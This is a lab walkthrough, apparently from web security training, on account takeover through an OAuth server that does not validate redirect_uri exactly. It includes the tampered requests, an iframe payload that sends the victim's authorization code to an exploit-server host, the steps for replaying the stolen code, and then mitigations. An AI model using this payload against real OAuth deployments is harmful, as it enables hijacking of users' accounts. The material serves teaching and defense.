# Lab 3: OAuth account hijacking via redirect_uri

## Description
This lab uses an OAuth authorization code flow, but the authorization server fails to strictly validate or enforce exact matching rules for the `redirect_uri` parameter. An attacker can supply an arbitrary endpoint (such as an exploit server), trick a victim into visiting a malicious link, and capture their authorization code to hijack the account.

## Exploitation Steps

1. **Observe the OAuth Flow:**
   - Log in to the application while proxying traffic through Burp Suite.
   - Locate the request sent to the OAuth authorization server:
     ```http
     GET /auth?client_id=CLIENT_ID&redirect_uri=[https://client-app.com/oauth-callback&response_type=code&scope=openid%20profile%20email](https://client-app.com/oauth-callback&response_type=code&scope=openid%20profile%20email) HTTP/1.1
     Host: oauth-server.net
     ```

2. **Test `redirect_uri` Validation:**
   - Send the request to Burp Repeater.
   - Change `redirect_uri` to point to your Exploit Server URL:
     ```http
     redirect_uri=[https://exploit-server.net/exploit](https://exploit-server.net/exploit)
     ```
   - Send the request and observe that the server redirects to your URL with an appended code:
     ```http
     HTTP/1.1 302 Found
     Location: [https://exploit-server.net/exploit?code=AUTH_CODE](https://exploit-server.net/exploit?code=AUTH_CODE)
     ```

3. **Construct the Exploit Payload:**
   - Go to the **Exploit Server** and add an iframe payload delivering the malicious request to the victim:
     ```html
     <iframe src="[https://oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://exploit-server.net/exploit&response_type=code&scope=openid%20profile%20email](https://oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://exploit-server.net/exploit&response_type=code&scope=openid%20profile%20email)"></iframe>
     ```
   - Click **Deliver exploit to victim**.

4. **Hijack the Account:**
   - Open the Exploit Server's **Access log**.
   - Find the GET request initiated by the victim containing their stolen code:
     `GET /exploit?code=STOLEN_CODE`
   - Copy the `code` value.
   - Send the authorization callback in your browser using the victim's stolen code:
     `https://client-app.com/oauth-callback?code=STOLEN_CODE`
   - You are now logged in as the victim.

## Mitigation Strategies

- **Strict URL Whitelisting:** Validate the `redirect_uri` parameter against an exact match whitelist registered for the client application during setup.
- **Reject Partial/Pattern Matching:** Avoid regex matching, prefix matching, or allowing arbitrary subdomains or query parameters.
- **Mandatory `state` Parameter:** Implement a unique, cryptographically random `state` parameter bound to the user's session to prevent CSRF and unauthorized code submission.
